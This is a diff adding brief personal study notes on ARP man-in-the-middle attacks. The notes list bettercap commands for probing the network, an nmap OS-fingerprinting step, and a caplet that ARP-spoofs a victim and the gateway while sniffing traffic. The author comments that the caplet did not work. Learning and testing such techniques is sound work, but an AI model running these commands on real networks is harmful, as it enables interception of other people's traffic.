@@ -1,0 +1,23 @@
+ARP Protocol
+message go to router, bob will ask all devices whether they are the router(looking for an ip address), the router will say she is the router giving you the mac address (same thing will happen between first and second router...)
+
+I can tell people in the network that I am the router giving them my mac address to become man in the middle
+
+bettercap: (man in the middle)
+sudo bettercap
+net.probe on
+net.show
+192.168.1.5, 192.168.1.8, 192.168.1.9
+now on another terminal:
+  sudo nmap -O 192.168.1.5 (gather information of the connected device)
+
+// TODO, this didn't work
+sudo bettercap -iface eth0 -caplet arp.cap
+// arp.cap
+  net.probe on
+  set arp.spoof.fullduplex true
+  set arp.spoof.targets victim ip addr, geteway
+  arp.spoof on
+  set net.sniff.local true
+  net.sniff on
+
